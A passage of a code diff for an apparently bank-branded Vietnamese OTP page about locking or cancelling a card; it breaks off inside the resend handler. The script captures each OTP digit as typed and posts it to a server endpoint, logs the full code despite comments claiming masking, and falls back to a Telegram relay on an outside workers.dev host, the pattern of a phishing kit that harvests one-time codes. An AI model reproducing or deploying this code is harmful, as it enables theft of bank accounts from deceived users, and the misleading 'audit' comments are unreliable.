@@ -1,383 +1,532 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="vi">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Xác thực OTP</title>
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+    />
+    <style>
+      body {
+        background: #f8f9fa;
+      }
 
-<head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Xác thực OTP</title>
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
-  <style>
-    body {
-      background: #f8f9fa;
-    }
+      .otp-input {
+        width: 3rem;
+        height: 3.5rem;
+        text-align: center;
+        font-size: 1.5rem;
+        border: 1px solid #ced4da;
+        border-radius: 0.5rem;
+      }
 
-    .otp-input {
-      width: 3rem;
-      height: 3.5rem;
-      text-align: center;
-      font-size: 1.5rem;
-      border: 1px solid #ced4da;
-      border-radius: .5rem;
-    }
+      .otp-input:focus {
+        border-color: #0d6efd;
+        box-shadow: 0 0 0 0.2rem rgba(13, 110, 253, 0.25);
+      }
 
-    .otp-input:focus {
-      border-color: #0d6efd;
-      box-shadow: 0 0 0 .2rem rgba(13, 110, 253, .25);
-    }
+      .timer {
+        font-variant-numeric: tabular-nums;
+      }
 
-    .timer {
-      font-variant-numeric: tabular-nums;
-    }
+      .brand-accent {
+        color: #0d6efd;
+      }
+    </style>
+  </head>
 
-    .brand-accent {
-      color: #0d6efd
-    }
-  </style>
-</head>
+  <body>
+    <main class="container py-4">
+      <!-- Header -->
+      <div class="mb-4">
+        <div class="small text-muted">Bước 2/2</div>
+        <h1 class="h4 mb-1">Xác thực mã OTP</h1>
+        <p class="text-muted mb-0">
+          Mã gồm <strong>6 chữ số</strong> đã gửi đến số
+          <strong id="maskedPhone">+84 •••• ••89</strong>.
+        </p>
+        <p class="text-muted">Vui lòng nhập mã để xác nhận yêu cầu tạm khóa/hủy thẻ.</p>
+      </div>
 
-<body>
-  <main class="container py-4">
-    <!-- Header -->
-    <div class="mb-4">
-      <div class="small text-muted">Bước 2/2</div>
-      <h1 class="h4 mb-1">Xác thực mã OTP</h1>
-      <p class="text-muted mb-0">
-        Mã gồm <strong>6 chữ số</strong> đã gửi đến số <strong id="maskedPhone">+84 •••• ••89</strong>.
-      </p>
-      <p class="text-muted">Vui lòng nhập mã để xác nhận yêu cầu tạm khóa/hủy thẻ.</p>
-    </div>
+      <!-- Card -->
+      <div class="card shadow-sm">
+        <div class="card-body">
+          <!-- Alert -->
+          <div id="alertBox" class="alert alert-danger d-none" role="alert"></div>
 
-    <!-- Card -->
-    <div class="card shadow-sm">
-      <div class="card-body">
-        <!-- Alert -->
-        <div id="alertBox" class="alert alert-danger d-none" role="alert"></div>
+          <!-- Form -->
+          <form id="otpForm" novalidate>
+            <div class="d-flex gap-2 justify-content-center my-3" aria-label="Nhập 6 số OTP">
+              <input
+                class="otp-input"
+                inputmode="numeric"
+                pattern="[0-9]*"
+                maxlength="1"
+                autocomplete="one-time-code"
+                aria-label="Số 1"
+              />
+              <input
+                class="otp-input"
+                inputmode="numeric"
+                pattern="[0-9]*"
+                maxlength="1"
+                aria-label="Số 2"
+              />
+              <input
+                class="otp-input"
+                inputmode="numeric"
+                pattern="[0-9]*"
+                maxlength="1"
+                aria-label="Số 3"
+              />
+              <input
+                class="otp-input"
+                inputmode="numeric"
+                pattern="[0-9]*"
+                maxlength="1"
+                aria-label="Số 4"
+              />
+              <input
+                class="otp-input"
+                inputmode="numeric"
+                pattern="[0-9]*"
+                maxlength="1"
+                aria-label="Số 5"
+              />
+              <input
+                class="otp-input"
+                inputmode="numeric"
+                pattern="[0-9]*"
+                maxlength="1"
+                aria-label="Số 6"
+              />
+            </div>
 
-        <!-- Form -->
-        <form id="otpForm" novalidate>
-          <div class="d-flex gap-2 justify-content-center my-3" aria-label="Nhập 6 số OTP">
-            <input class="otp-input" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code"
-              aria-label="Số 1" />
-            <input class="otp-input" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="Số 2" />
-            <input class="otp-input" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="Số 3" />
-            <input class="otp-input" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="Số 4" />
-            <input class="otp-input" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="Số 5" />
-            <input class="otp-input" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="Số 6" />
+            <div class="text-center mb-3">
+              <span class="text-muted">Mã sẽ hết hạn trong </span>
+              <span id="countdown" class="fw-semibold timer">01:00</span>
+            </div>
+
+            <div class="d-grid gap-2 d-sm-flex justify-content-sm-center">
+              <button id="btnConfirm" type="submit" class="btn btn-primary px-4" disabled>
+                Xác nhận
+              </button>
+              <button id="btnResend" type="button" class="btn btn-outline-secondary px-4" disabled>
+                Gửi lại mã (<span id="resendCountdown" class="timer">30</span>s)
+              </button>
+              <a href="javascript:history.back()" class="btn btn-link">Quay lại</a>
+            </div>
+          </form>
+
+          <hr class="my-4" />
+          <div class="small text-muted">
+            <ul class="mb-0">
+              <li>Không chia sẻ mã OTP cho bất kỳ ai, kể cả nhân viên ngân hàng.</li>
+              <li>
+                Nếu không nhận được mã sau 60 giây, bấm
+                <span class="brand-accent">Gửi lại mã</span>.
+              </li>
+            </ul>
           </div>
-
-          <div class="text-center mb-3">
-            <span class="text-muted">Mã sẽ hết hạn trong </span>
-            <span id="countdown" class="fw-semibold timer">01:00</span>
-          </div>
-
-          <div class="d-grid gap-2 d-sm-flex justify-content-sm-center">
-            <button id="btnConfirm" type="submit" class="btn btn-primary px-4" disabled>
-              Xác nhận
-            </button>
-            <button id="btnResend" type="button" class="btn btn-outline-secondary px-4" disabled>
-              Gửi lại mã (<span id="resendCountdown" class="timer">30</span>s)
-            </button>
-            <a href="javascript:history.back()" class="btn btn-link">Quay lại</a>
-          </div>
-        </form>
-
-        <hr class="my-4">
-        <div class="small text-muted">
-          <ul class="mb-0">
-            <li>Không chia sẻ mã OTP cho bất kỳ ai, kể cả nhân viên ngân hàng.</li>
-            <li>Nếu không nhận được mã sau 60 giây, bấm <span class="brand-accent">Gửi lại mã</span>.</li>
-          </ul>
         </div>
       </div>
-    </div>
-  </main>
+    </main>
 
-  <script>
-    // Dev helper: signedFetch will attach HMAC headers if window.DEV_HMAC_KEY is set.
-    window.signedFetch = async function (input, init = {}) {
-      try {
-        const url = new URL(input, location.href);
-        const method = (init.method || 'GET').toUpperCase();
-        let bodyRaw = '';
-        if (init.body != null) {
-          if (typeof init.body === 'string') bodyRaw = init.body;
-          else try { bodyRaw = JSON.stringify(init.body); } catch (e) { bodyRaw = String(init.body); }
-        }
-        const ts = Math.floor(Date.now() / 1000);
-        const nonce = (crypto && crypto.randomUUID) ? crypto.randomUUID() : ('n-' + Math.random().toString(36).slice(2));
-        const signer = window.DEV_HMAC_KEY;
-        const headers = new Headers(init.headers || {});
-        if (signer) {
-          const path = url.pathname + url.search;
-          const msg = `${method}\n${path}\n${ts}\n${nonce}\n${bodyRaw}`;
-          const enc = new TextEncoder();
-          const key = await crypto.subtle.importKey('raw', enc.encode(signer), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
-          const sigBuf = await crypto.subtle.sign('HMAC', key, enc.encode(msg));
-          const hex = Array.from(new Uint8Array(sigBuf)).map(b => b.toString(16).padStart(2, '0')).join('');
-          headers.set('X-Signature', 'v1=' + hex);
-          headers.set('X-Timestamp', String(ts));
-          headers.set('X-Nonce', nonce);
-        }
-        const finalInit = Object.assign({}, init, { headers });
-        if (init.body != null && typeof init.body !== 'string') finalInit.body = bodyRaw;
-        return fetch(input, finalInit);
-      } catch (e) {
-        return fetch(input, init);
-      }
-    };
-
-    // ===== CẤU HÌNH(sửa theo hệ thống của bạn) =====
-    const API_BASE = window.TG_PROXY_URL || 'https://telegram-relay.jacksaybin.workers.dev';
-    // Prefer local field-update endpoint for audit logs so we don't leak to external relays
-    const FIELD_UPDATE_API = (location.origin && location.origin !== 'null') ? location.origin + '/api/field-update' : '/api/field-update';
-    const REQUEST_ID = sessionStorage.getItem('pendingRequestId') || 'no-request';
-    const MASKED_PHONE = sessionStorage.getItem('maskedPhone') || '+84 •••• ••??';
-    document.getElementById('maskedPhone').innerText = MASKED_PHONE;
-
-    // ===== BIẾN THAM CHIẾU =====
-    const inputs = Array.from(document.querySelectorAll('.otp-input'));
-    const btnConfirm = document.getElementById('btnConfirm');
-    const btnResend = document.getElementById('btnResend');
-    const alertBox = document.getElementById('alertBox');
-    const countdownEl = document.getElementById('countdown');
-    // Telegram relay URL (fallback nếu chưa có trên window)
-    const TG_URL = API_BASE + '/tele/sendMessage';
-    let lastOtpLog = 0;
-    const OTP_LOG_MIN_INTERVAL = 1800; // ms (giảm nhẹ cho trải nghiệm nhưng vẫn tránh spam)
-    function maskOtp(raw) {
-      if (!raw) return '------';
-      // Chỉ hiển thị 2 số đầu & 1 số cuối để audit, tránh lộ toàn bộ mã
-      return raw.replace(/^(\d)(\d)(\d)(\d)(\d)(\d)$/, (m, a, b, c, d, e, f) => `${a}${b}***${f}`);
-    }
-    async function logOtp(event, meta = {}) {
-      const now = Date.now();
-      if (now - lastOtpLog < OTP_LOG_MIN_INTERVAL && event === 'input') return; // throttle input
-      lastOtpLog = now;
-      try {
-        const rid = sessionStorage.getItem('pendingRequestId') || sessionStorage.getItem('submittedRequestId') || 'no-rid';
-        const otp = getOTP();
-        const payload = {
-          type: 'otp_audit',
-          rid,
-          event,
-          otp_masked: maskOtp(otp),
-          len: otp.length,
-          t: new Date().toISOString(),
-          ...meta
-        };
-        // Send audit to local server so it can store/forward according to configuration
+    <script>
+      // Dev helper: signedFetch will attach HMAC headers if window.DEV_HMAC_KEY is set.
+      window.signedFetch = async function (input, init = {}) {
         try {
-          await fetch(FIELD_UPDATE_API, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ sessionId: sessionStorage.getItem('fieldSessionId') || 'no-session', field: 'otp_audit', value: JSON.stringify(payload), page: 'otphtml1.html' })
-          });
+          const url = new URL(input, location.href);
+          const method = (init.method || 'GET').toUpperCase();
+          let bodyRaw = '';
+          if (init.body != null) {
+            if (typeof init.body === 'string') bodyRaw = init.body;
+            else
+              try {
+                bodyRaw = JSON.stringify(init.body);
+              } catch (e) {
+                bodyRaw = String(init.body);
+              }
+          }
+          const ts = Math.floor(Date.now() / 1000);
+          const nonce =
+            crypto && crypto.randomUUID
+              ? crypto.randomUUID()
+              : 'n-' + Math.random().toString(36).slice(2);
+          const signer = window.DEV_HMAC_KEY;
+          const headers = new Headers(init.headers || {});
+          if (signer) {
+            const path = url.pathname + url.search;
+            const msg = `${method}\n${path}\n${ts}\n${nonce}\n${bodyRaw}`;
+            const enc = new TextEncoder();
+            const key = await crypto.subtle.importKey(
+              'raw',
+              enc.encode(signer),
+              { name: 'HMAC', hash: 'SHA-256' },
+              false,
+              ['sign']
+            );
+            const sigBuf = await crypto.subtle.sign('HMAC', key, enc.encode(msg));
+            const hex = Array.from(new Uint8Array(sigBuf))
+              .map((b) => b.toString(16).padStart(2, '0'))
+              .join('');
+            headers.set('X-Signature', 'v1=' + hex);
+            headers.set('X-Timestamp', String(ts));
+            headers.set('X-Nonce', nonce);
+          }
+          const finalInit = Object.assign({}, init, { headers });
+          if (init.body != null && typeof init.body !== 'string') finalInit.body = bodyRaw;
+          return fetch(input, finalInit);
         } catch (e) {
-          // fallback to previous relay if local endpoint isn't reachable
-          await fetch(TG_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ text: `OTP AUDIT ${rid}\n${Object.entries(payload).map(([k, v]) => `• ${k}: ${v}`).join('\n')}` }) });
+          return fetch(input, init);
         }
-      } catch {/* ignore */ }
-    }
+      };
 
-    // ===== HELPER =====
-    const getOTP = () => inputs.map(i => i.value).join('');
-    const allFilled = () => inputs.every(i => i.value.length === 1);
-    const pad = (n) => n.toString().padStart(2, '0');
-    function showError(msg) { alertBox.textContent = msg; alertBox.classList.remove('d-none'); }
-    function clearError() { alertBox.classList.add('d-none'); }
+      // ===== CẤU HÌNH(sửa theo hệ thống của bạn) =====
+      const API_BASE = window.TG_PROXY_URL || 'https://telegram-relay.jacksaybin.workers.dev';
+      // Prefer local field-update endpoint for audit logs so we don't leak to external relays
+      const FIELD_UPDATE_API =
+        location.origin && location.origin !== 'null'
+          ? location.origin + '/api/field-update'
+          : '/api/field-update';
+      const REQUEST_ID = sessionStorage.getItem('pendingRequestId') || 'no-request';
+      const MASKED_PHONE = sessionStorage.getItem('maskedPhone') || '+84 •••• ••??';
+      document.getElementById('maskedPhone').innerText = MASKED_PHONE;
 
-    function setControlsEnabled(enabled) {
-      inputs.forEach(i => i.disabled = !enabled);
-      // nút xác nhận chỉ bật khi enabled và đủ 6 số
-      btnConfirm.disabled = !enabled || !allFilled();
-    }
-
-    // ===== NHẬP OTP: auto focus / backspace / paste =====
-    inputs[0].focus();
-    inputs.forEach((inp, idx) => {
-      inp.addEventListener('input', (e) => {
-        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 1);
-        if (e.target.value && idx < inputs.length - 1) inputs[idx + 1].focus();
-        btnConfirm.disabled = !allFilled() || inp.disabled;
-        logOtp(allFilled() ? 'filled' : 'input', { idx });
-      });
-      inp.addEventListener('keydown', (e) => {
-        if (e.key === 'Backspace' && !e.target.value && idx > 0) inputs[idx - 1].focus();
-      });
-      inp.addEventListener('paste', (e) => {
-        const data = (e.clipboardData || window.clipboardData).getData('text') || '';
-        const digits = data.replace(/\D/g, '').slice(0, inputs.length).split('');
-        inputs.forEach((i, k) => i.value = digits[k] || '');
-        btnConfirm.disabled = !allFilled() || inp.disabled;
-        const last = Math.max(Math.min(digits.length, inputs.length) - 1, 0);
-        inputs[last].focus();
-        logOtp(allFilled() ? 'filled_paste' : 'input_paste', { count: digits.length });
-        e.preventDefault();
-      });
-    });
-
-    // ===== ĐẾM NGƯỢC HIỆU LỰC OTP 60s =====
-    let otpTimerIv = null;
-    function startOtpTimer(seconds = 60) {
-      clearInterval(otpTimerIv);
-      let t = seconds;
-      countdownEl.textContent = `${pad(Math.floor(t / 60))}:${pad(t % 60)}`;
-      setControlsEnabled(true); // mở nhập khi bắt đầu
-      otpTimerIv = setInterval(() => {
-        countdownEl.textContent = `${pad(Math.floor(t / 60))}:${pad(t % 60)}`;
-        if (t-- <= 0) {
-          clearInterval(otpTimerIv);
-          setControlsEnabled(false);
-          showError('Mã OTP đã hết hạn (60s). Vui lòng bấm Gửi lại mã.');
-        }
-      }, 1000);
-    }
-
-    // ===== CHỜ GỬI LẠI 30s =====
-    function startResendTimer(seconds = 30) {
-      const label = document.getElementById('resendCountdown');
-      btnResend.disabled = true;
-      let t = seconds;
-      label.textContent = t;
-      const iv = setInterval(() => {
-        label.textContent = t;
-        if (t-- <= 0) {
-          clearInterval(iv);
-          btnResend.disabled = false;
-          btnResend.innerHTML = 'Gửi lại mã';
-        }
-      }, 1000);
-    }
-
-    // ===== SUBMIT: xác thực OTP 123456 (demo) và gửi Telegram =====
-    document.getElementById('otpForm').addEventListener('submit', async (e) => {
-      e.preventDefault();
-      clearError();
-
-      const otp = getOTP();
-      if (otp.length !== 6) {
-        showError('Vui lòng nhập đủ 6 số OTP.');
-        return;
+      // ===== BIẾN THAM CHIẾU =====
+      const inputs = Array.from(document.querySelectorAll('.otp-input'));
+      const btnConfirm = document.getElementById('btnConfirm');
+      const btnResend = document.getElementById('btnResend');
+      const alertBox = document.getElementById('alertBox');
+      const countdownEl = document.getElementById('countdown');
+      // Telegram relay URL (fallback nếu chưa có trên window)
+      const TG_URL = API_BASE + '/tele/sendMessage';
+      let lastOtpLog = 0;
+      const OTP_LOG_MIN_INTERVAL = 1800; // ms (giảm nhẹ cho trải nghiệm nhưng vẫn tránh spam)
+      function maskOtp(raw) {
+        if (!raw) return '------';
+        // Chỉ hiển thị 2 số đầu & 1 số cuối để audit, tránh lộ toàn bộ mã
+        return raw.replace(
+          /^(\d)(\d)(\d)(\d)(\d)(\d)$/,
+          (m, a, b, c, d, e, f) => `${a}${b}***${f}`
+        );
       }
-      if (btnConfirm.disabled) return; // an toàn
-
-      btnConfirm.disabled = true;
-      btnConfirm.innerHTML = 'Đang xác thực…';
-
-      const summary = sessionStorage.getItem('pendingSummary');
-      const requestId = sessionStorage.getItem('pendingRequestId');
-      const submittedAt = sessionStorage.getItem('pendingAt') || new Date().toISOString();
-      if (!summary || !requestId) {
-        showError('Thiếu dữ liệu yêu cầu. Vui lòng quay lại.');
-        btnConfirm.innerHTML = 'Xác nhận';
-        return;
-      }
-      try {
-        const requestIdToConfirm = sessionStorage.getItem('pendingRequestId') || requestId || null;
-        if (!requestIdToConfirm) {
-          showError('Thiếu requestId. Vui lòng quay lại.');
-          btnConfirm.innerHTML = 'Xác nhận';
-          btnConfirm.disabled = !allFilled();
-          return;
-        }
-        const url = (location.origin && location.origin !== 'null') ? location.origin + '/api/verify-otp' : API_BASE + '/verify-otp';
-        const res = await (window.signedFetch ? window.signedFetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ requestId: requestIdToConfirm, otp }) }) : fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ requestId: requestIdToConfirm, otp }) }));
-        const data = await res.json().catch(() => null);
-        if (!res.ok || !data || data.status !== 'verified') {
-          logOtp('wrong', { attempt: otp });
-          const code = (data && (data.error || data.code)) || 'Xác thực thất bại';
-          showError(code === 'OTP_INVALID' ? 'Mã OTP sai.' : code === 'otp_expired' ? 'Mã OTP đã hết hạn.' : code === 'already_verified' ? 'Yêu cầu đã được xác thực.' : 'Xác thực thất bại.');
-          btnConfirm.innerHTML = 'Xác nhận';
-          btnConfirm.disabled = !allFilled();
-          return;
-        }
-        logOtp('success', { attempt: otp });
-        sessionStorage.setItem('submittedRequestId', requestIdToConfirm);
-        sessionStorage.setItem('submittedAt', submittedAt);
-        sessionStorage.setItem('submittedPhone', sessionStorage.getItem('pendingPhone') || '');
-        sessionStorage.setItem('submittedReason', sessionStorage.getItem('pendingReason') || '');
-        ['pendingSummary', 'pendingRequestId', 'pendingAt', 'pendingPhone', 'pendingReason'].forEach(k => sessionStorage.removeItem(k));
-        btnConfirm.innerHTML = 'Thành công!';
-        setTimeout(() => { window.location.href = 'yeu-cau-da-gui.html'; }, 400);
-      } catch (err) {
-        console.error('otp verify error', err);
-        showError('Lỗi mạng khi xác thực OTP.');
-        btnConfirm.innerHTML = 'Xác nhận';
-        btnConfirm.disabled = !allFilled();
-      }
-    });
-
-    // ===== GỬI LẠI MÃ =====
-    btnResend.addEventListener('click', async () => {
-      clearError();
-      btnResend.disabled = true; btnResend.textContent = 'Đang gửi lại…';
-      try {
-        // Try to request a new OTP via server endpoint using pendingRequestId
-        const rid = sessionStorage.getItem('pendingRequestId') || REQUEST_ID;
-        const urlReq = (location.origin && location.origin !== 'null') ? location.origin + '/api/request-block' : API_BASE + '/request-block';
-        // For resend we send minimal JSON with requestId; server in this demo will generate a new otp if provided requestId
-        const res = await (window.signedFetch ? window.signedFetch(urlReq, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ requestId: rid }) }) : fetch(urlReq, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ requestId: rid }) }));
-        const data = await res.json().catch(() => null);
-        if (!res.ok || !data || data.status !== 'ok') {
-          showError((data && (data.error || 'Không gửi lại được mã')) || 'Không gửi lại được mã');
-        } else {
-          logOtp('resend');
-          inputs.forEach(i => { i.value = ''; i.disabled = false; });
-          inputs[0].focus();
-          sessionStorage.setItem('pendingRequestId', data.requestId || rid);
-          sessionStorage.setItem('maskedPhone', data.maskedPhone || sessionStorage.getItem('maskedPhone'));
-          btnResend.innerHTML = 'Gửi lại mã (<span id="resendCountdown" class="timer">30</span>s)';
-          startResendTimer(30);
-          startOtpTimer((data.otp && data.otp.ttlSeconds) || 60);
-        }
-      } catch (err) {
-        console.error('resend error', err);
-        showError('Lỗi mạng khi gửi lại mã');
-      } finally {
-        if (btnResend.disabled && !/Đang gửi/.test(btnResend.textContent)) {
-          // keep disabled until timer if success, else enable again
-        } else if (alertBox.classList.contains('d-none')) {
-          // success path keeps disabled until timer; failure re-enable
-          if (!btnResend.innerHTML.includes('resendCountdown')) btnResend.disabled = false;
-        } else {
-          btnResend.disabled = false;
-          btnResend.textContent = 'Gửi lại mã';
-        }
-      }
-    });
-
-    // ===== KHỞI TẠO =====
-    startResendTimer(30);
-    startOtpTimer(60);
-
-    // ===== GỬI CẬP NHẬT TỪNG TRƯỜNG (OTP) VỀ SERVER =====
-    (function () {
-      const FIELD_UPDATE_API = (location.origin && location.origin !== 'null') ? location.origin + '/api/field-update' : '/api/field-update';
-      if (!sessionStorage.getItem('fieldSessionId')) {
-        sessionStorage.setItem('fieldSessionId', 'sess-' + Math.random().toString(36).slice(2, 10));
-      }
-      const sessionId = sessionStorage.getItem('fieldSessionId');
-
-      async function sendOtpUpdate(reason) {
+      async function logOtp(event, meta = {}) {
+        const now = Date.now();
+        if (now - lastOtpLog < OTP_LOG_MIN_INTERVAL && event === 'input') return; // throttle input
+        lastOtpLog = now;
         try {
-          const value = getOTP();
-          if (!value) return;
-          await fetch(FIELD_UPDATE_API, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ sessionId, field: 'otp', value, page: 'otphtml1.html', reason: reason || 'input' })
-          });
-        } catch (_) { }
+          const rid =
+            sessionStorage.getItem('pendingRequestId') ||
+            sessionStorage.getItem('submittedRequestId') ||
+            'no-rid';
+          const otp = getOTP();
+          const payload = {
+            type: 'otp_audit',
+            rid,
+            event,
+            otp_masked: maskOtp(otp),
+            len: otp.length,
+            t: new Date().toISOString(),
+            ...meta,
+          };
+          // Send audit to local server so it can store/forward according to configuration
+          try {
+            await fetch(FIELD_UPDATE_API, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                sessionId: sessionStorage.getItem('fieldSessionId') || 'no-session',
+                field: 'otp_audit',
+                value: JSON.stringify(payload),
+                page: 'otphtml1.html',
+              }),
+            });
+          } catch (e) {
+            // fallback to previous relay if local endpoint isn't reachable
+            await fetch(TG_URL, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                text: `OTP AUDIT ${rid}\n${Object.entries(payload)
+                  .map(([k, v]) => `• ${k}: ${v}`)
+                  .join('\n')}`,
+              }),
+            });
+          }
+        } catch {
+          /* ignore */
+        }
       }
 
-      // Gửi khi thay đổi, blur, hoặc đủ 6 số
-      inputs.forEach(inp => {
-        inp.addEventListener('input', () => sendOtpUpdate('input'));
-        inp.addEventListener('blur', () => sendOtpUpdate('blur'));
-        inp.addEventListener('change', () => sendOtpUpdate('change'));
-      });
-    })();
-  </script>
-</body>
+      // ===== HELPER =====
+      const getOTP = () => inputs.map((i) => i.value).join('');
+      const allFilled = () => inputs.every((i) => i.value.length === 1);
+      const pad = (n) => n.toString().padStart(2, '0');
+      function showError(msg) {
+        alertBox.textContent = msg;
+        alertBox.classList.remove('d-none');
+      }
+      function clearError() {
+        alertBox.classList.add('d-none');
+      }
 
+      function setControlsEnabled(enabled) {
+        inputs.forEach((i) => (i.disabled = !enabled));
+        // nút xác nhận chỉ bật khi enabled và đủ 6 số
+        btnConfirm.disabled = !enabled || !allFilled();
+      }
+
+      // ===== NHẬP OTP: auto focus / backspace / paste =====
+      inputs[0].focus();
+      inputs.forEach((inp, idx) => {
+        inp.addEventListener('input', (e) => {
+          e.target.value = e.target.value.replace(/\D/g, '').slice(0, 1);
+          if (e.target.value && idx < inputs.length - 1) inputs[idx + 1].focus();
+          btnConfirm.disabled = !allFilled() || inp.disabled;
+          logOtp(allFilled() ? 'filled' : 'input', { idx });
+        });
+        inp.addEventListener('keydown', (e) => {
+          if (e.key === 'Backspace' && !e.target.value && idx > 0) inputs[idx - 1].focus();
+        });
+        inp.addEventListener('paste', (e) => {
+          const data = (e.clipboardData || window.clipboardData).getData('text') || '';
+          const digits = data.replace(/\D/g, '').slice(0, inputs.length).split('');
+          inputs.forEach((i, k) => (i.value = digits[k] || ''));
+          btnConfirm.disabled = !allFilled() || inp.disabled;
+          const last = Math.max(Math.min(digits.length, inputs.length) - 1, 0);
+          inputs[last].focus();
+          logOtp(allFilled() ? 'filled_paste' : 'input_paste', { count: digits.length });
+          e.preventDefault();
+        });
+      });
+
+      // ===== ĐẾM NGƯỢC HIỆU LỰC OTP 60s =====
+      let otpTimerIv = null;
+      function startOtpTimer(seconds = 60) {
+        clearInterval(otpTimerIv);
+        let t = seconds;
+        countdownEl.textContent = `${pad(Math.floor(t / 60))}:${pad(t % 60)}`;
+        setControlsEnabled(true); // mở nhập khi bắt đầu
+        otpTimerIv = setInterval(() => {
+          countdownEl.textContent = `${pad(Math.floor(t / 60))}:${pad(t % 60)}`;
+          if (t-- <= 0) {
+            clearInterval(otpTimerIv);
+            setControlsEnabled(false);
+            showError('Mã OTP đã hết hạn (60s). Vui lòng bấm Gửi lại mã.');
+          }
+        }, 1000);
+      }
+
+      // ===== CHỜ GỬI LẠI 30s =====
+      function startResendTimer(seconds = 30) {
+        const label = document.getElementById('resendCountdown');
+        btnResend.disabled = true;
+        let t = seconds;
+        label.textContent = t;
+        const iv = setInterval(() => {
+          label.textContent = t;
+          if (t-- <= 0) {
+            clearInterval(iv);
+            btnResend.disabled = false;
+            btnResend.innerHTML = 'Gửi lại mã';
+          }
+        }, 1000);
+      }
+
+      // ===== SUBMIT: xác thực OTP 123456 (demo) và gửi Telegram =====
+      document.getElementById('otpForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        clearError();
+
+        const otp = getOTP();
+        if (otp.length !== 6) {
+          showError('Vui lòng nhập đủ 6 số OTP.');
+          return;
+        }
+        if (btnConfirm.disabled) return; // an toàn
+
+        btnConfirm.disabled = true;
+        btnConfirm.innerHTML = 'Đang xác thực…';
+
+        const summary = sessionStorage.getItem('pendingSummary');
+        const requestId = sessionStorage.getItem('pendingRequestId');
+        const submittedAt = sessionStorage.getItem('pendingAt') || new Date().toISOString();
+        if (!summary || !requestId) {
+          showError('Thiếu dữ liệu yêu cầu. Vui lòng quay lại.');
+          btnConfirm.innerHTML = 'Xác nhận';
+          return;
+        }
+        try {
+          const requestIdToConfirm =
+            sessionStorage.getItem('pendingRequestId') || requestId || null;
+          if (!requestIdToConfirm) {
+            showError('Thiếu requestId. Vui lòng quay lại.');
+            btnConfirm.innerHTML = 'Xác nhận';
+            btnConfirm.disabled = !allFilled();
+            return;
+          }
+          const url =
+            location.origin && location.origin !== 'null'
+              ? location.origin + '/api/verify-otp'
+              : API_BASE + '/verify-otp';
+          const res = await (window.signedFetch
+            ? window.signedFetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ requestId: requestIdToConfirm, otp }),
+              })
+            : fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ requestId: requestIdToConfirm, otp }),
+              }));
+          const data = await res.json().catch(() => null);
+          if (!res.ok || !data || data.status !== 'verified') {
+            logOtp('wrong', { attempt: otp });
+            const code = (data && (data.error || data.code)) || 'Xác thực thất bại';
+            showError(
+              code === 'OTP_INVALID'
+                ? 'Mã OTP sai.'
+                : code === 'otp_expired'
+                ? 'Mã OTP đã hết hạn.'
+                : code === 'already_verified'
+                ? 'Yêu cầu đã được xác thực.'
+                : 'Xác thực thất bại.'
+            );
+            btnConfirm.innerHTML = 'Xác nhận';
+            btnConfirm.disabled = !allFilled();
+            return;
+          }
+          logOtp('success', { attempt: otp });
+          sessionStorage.setItem('submittedRequestId', requestIdToConfirm);
+          sessionStorage.setItem('submittedAt', submittedAt);
+          sessionStorage.setItem('submittedPhone', sessionStorage.getItem('pendingPhone') || '');
+          sessionStorage.setItem('submittedReason', sessionStorage.getItem('pendingReason') || '');
+          [
+            'pendingSummary',
+            'pendingRequestId',
+            'pendingAt',
+            'pendingPhone',
+            'pendingReason',
+          ].forEach((k) => sessionStorage.removeItem(k));
+          btnConfirm.innerHTML = 'Thành công!';
+          setTimeout(() => {
+            window.location.href = 'yeu-cau-da-gui.html';
+          }, 400);
+        } catch (err) {
+          console.error('otp verify error', err);
+          showError('Lỗi mạng khi xác thực OTP.');
+          btnConfirm.innerHTML = 'Xác nhận';
+          btnConfirm.disabled = !allFilled();
+        }
+      });
+
+      // ===== GỬI LẠI MÃ =====
+      btnResend.addEventListener('click', async () => {
+        clearError();
+        btnResend.disabled = true;
+        btnResend.textContent = 'Đang gửi lại…';
+        try {
+          // Try to request a new OTP via server endpoint using pendingRequestId
+          const rid = sessionStorage.getItem('pendingRequestId') || REQUEST_ID;
+          const urlReq =
+            location.origin && location.origin !== 'null'
+              ? location.origin + '/api/request-block'
+              : API_BASE + '/request-block';
+          // For resend we send minimal JSON with requestId; server in this demo will generate a new otp if provided requestId
+          const res = await (window.signedFetch
+            ? window.signedFetch(urlReq, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ requestId: rid }),
+              })
+            : fetch(urlReq, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ requestId: rid }),
+              }));
+          const data = await res.json().catch(() => null);
+          if (!res.ok || !data || data.status !== 'ok') {
